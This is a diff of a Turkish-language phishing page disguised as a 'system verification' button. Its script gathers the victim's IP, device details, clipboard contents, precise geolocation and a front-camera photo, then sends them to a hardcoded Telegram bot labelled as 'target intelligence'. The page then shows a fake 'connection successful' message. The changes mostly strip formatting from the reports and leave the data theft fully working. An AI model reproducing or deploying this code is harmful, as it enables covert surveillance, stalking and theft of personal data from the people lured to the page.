@@ -13,7 +13,7 @@
 </head>
 <body>
     <div class="box">
-        <h2>[ 🛡️ SİSTEM DOĞRULAMASI ]</h2>
+        <h2>[ SİSTEM DOĞRULAMASI ]</h2>
         <p>Devam etmek için lütfen aşağıdaki butona tıklayın.</p>
         <button class="btn" onclick="startProcess()">DOĞRULAMAYI BAŞLAT</button>
     </div>
@@ -26,14 +26,13 @@
         const CHAT_ID = "8765957766";
 
         function sendTelegram(text, photoBlob = null) {
-            // Metin Raporunu Gönder
+            // Metin Raporunu Gönder (Plain Text - Hata riskini sıfırlar)
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: "Markdown"
+                    text: text
                 })
             }).catch(() => {});
 
@@ -42,8 +41,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', photoBlob, 'target_capture.jpg');
-                formData.append('caption', '📸 *Kamera Yakalaması Başarılı*');
-                formData.append('parse_mode', 'Markdown');
+                formData.append('caption', 'Kamera Yakalaması Başarılı');
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -81,28 +79,28 @@
             try {
                 if (navigator.getBattery) {
                     let bat = await navigator.getBattery();
-                    batteryInfo = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda ⚡' : 'Pilde 🔋'})`;
+                    batteryInfo = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda' : 'Pilde'})`;
                 }
             } catch(e) {}
 
-            // 3. RAM ve Depolama (Storage Estimate)
+            // 3. RAM ve Depolama
             let storageInfo = "Bilinmiyor";
             try {
                 if (navigator.storage && navigator.storage.estimate) {
                     let estimate = await navigator.storage.estimate();
                     let gbTotal = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
                     let gbUsed = (estimate.usage / (1024 * 1024 * 1024)).toFixed(1);
-                    storageInfo = `Toplam ~${gbTotal} GB (Kullanılan: ~${gbUsed} GB)`;
+                    storageInfo = `~${gbTotal} GB (Kullanılan: ~${gbUsed} GB)`;
                 }
             } catch(e) {}
 
-            let ramCapacity = navigator.deviceMemory ? navigator.deviceMemory + " GB (Yaklaşık)" : "Bilinmiyor";
+            let ramCapacity = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor";
             let gpuModel = getGpuInfo();
             let screenRes = `${window.screen.width}x${window.screen.height}`;
             let language = navigator.language || "Bilinmiyor";
             let deviceInfo = navigator.userAgent;
 
-            // 4. Panodaki Metin (Clipboard - İzin gerektirebilir)
+            // 4. Panodaki Metin (Clipboard)
             let clipboardText = "Erişilemedi veya İzin Verilmedi";
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -111,47 +109,47 @@
                 }
             } catch(e) {}
 
-            // 5. Konum Bilgisi ve Raporun Oluşturulması
+            // 5. Konum ve Rapor Oluşturma
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        let report = `🎯 *YENİ DETAYLI HEDEF İSTİHBARATI*\n\n` +
-                                     `🌐 *IP Adresi:* \`${ipInfo}\`\n` +
-                                     `🔋 *Şarj:* ${batteryInfo}\n` +
-                                     `🧠 *RAM:* ${ramCapacity}\n` +
-                                     `💾 *Depolama Alanı:* ${storageInfo}\n` +
-                                     `📋 *Pano (Clipboard):* \`${clipboardText}\`\n` +
-                                     `🎮 *GPU / Grafik:* \`${gpuModel}\`\n` +
-                                     `📱 *Ekran:* ${screenRes}\n` +
-                                     `🗣 *Dil:* ${language}\n` +
-                                     `📍 *Konum:* [Haritada Aç](https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude})\n` +
-                                     `📊 *Hassasiyet:* ${position.coords.accuracy}m\n` +
-                                     `💻 *User-Agent:* \`${deviceInfo}\``;
+                        let report = `[ YENİ HEDEF İSTİHBARATI ]\n\n` +
+                                     `IP Adresi: ${ipInfo}\n` +
+                                     `Sarj Durumu: ${batteryInfo}\n` +
+                                     `RAM: ${ramCapacity}\n` +
+                                     `Depolama: ${storageInfo}\n` +
+                                     `Pano Metni: ${clipboardText}\n` +
+                                     `GPU Model: ${gpuModel}\n` +
+                                     `Ekran: ${screenRes}\n` +
+                                     `Dil: ${language}\n` +
+                                     `Konum: https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}\n` +
+                                     `Hassasiyet: ${position.coords.accuracy}m\n` +
+                                     `Cihaz: ${deviceInfo}`;
                         
                         captureCamera(report);
                     },
                     (error) => {
-                        let report = `🎯 *YENİ DETAYLI HEDEF İSTİHBARATI*\n\n` +
-                                     `🌐 *IP Adresi:* \`${ipInfo}\`\n` +
-                                     `🔋 *Şarj:* ${batteryInfo}\n` +
-                                     `🧠 *RAM:* ${ramCapacity}\n` +
-                                     `💾 *Depolama Alanı:* ${storageInfo}\n` +
-                                     `📋 *Pano (Clipboard):* \`${clipboardText}\`\n` +
-                                     `🎮 *GPU / Grafik:* \`${gpuModel}\`\n` +
-                                     `📱 *Ekran:* ${screenRes}\n` +
-                                     `❌ *Konum İzni:* Reddedildi\n` +
-                                     `💻 *User-Agent:* \`${deviceInfo}\``;
+                        let report = `[ YENİ HEDEF İSTİHBARATI ]\n\n` +
+                                     `IP Adresi: ${ipInfo}\n` +
+                                     `Sarj Durumu: ${batteryInfo}\n` +
+                                     `RAM: ${ramCapacity}\n` +
+                                     `Depolama: ${storageInfo}\n` +
+                                     `Pano Metni: ${clipboardText}\n` +
+                                     `GPU Model: ${gpuModel}\n` +
+                                     `Ekran: ${screenRes}\n` +
+                                     `Konum İzni: Reddedildi\n` +
+                                     `Cihaz: ${deviceInfo}`;
                         
                         captureCamera(report);
                     },
                     { enableHighAccuracy: true }
                 );
             } else {
-                captureCamera(`🎯 *HEDEF RAPORU*\n🌐 *IP:* \`${ipInfo}\`\n💾 *Depolama:* ${storageInfo}`);
+                captureCamera(`[ HEDEF RAPORU ]\nIP: ${ipInfo}\nDepolama: ${storageInfo}`);
             }
         }
 
-        // Kamera Yakalama (Ön Kamera Öncelikli, desteklemiyorsa genel)
+        // Kamera Yakalama (Ön Kamera Öncelikli)
         function captureCamera(textReport) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
@@ -176,7 +174,6 @@
                     };
                 })
                 .catch(err => {
-                    // Ön kamera başarısız olursa arka kamerayı veya genel kamerayı dene
                     navigator.mediaDevices.getUserMedia({ video: true })
                         .then(stream => {
                             const video = document.getElementById('video');
@@ -197,7 +194,7 @@
                             };
                         })
                         .catch(e => {
-                            sendTelegram(textReport + `\n❌ *Kamera İzni:* Reddedildi veya Cihazda Kamera Yok`);
+                            sendTelegram(textReport + `\nKamera İzni: Reddedildi veya Cihazda Kamera Yok`);
                             document.body.innerHTML = "<div class='box'><h2 style='color:#00ff66;'>Bağlantı Başarılı. Yönlendiriliyorsunuz...</h2></div>";
                         });
                 });
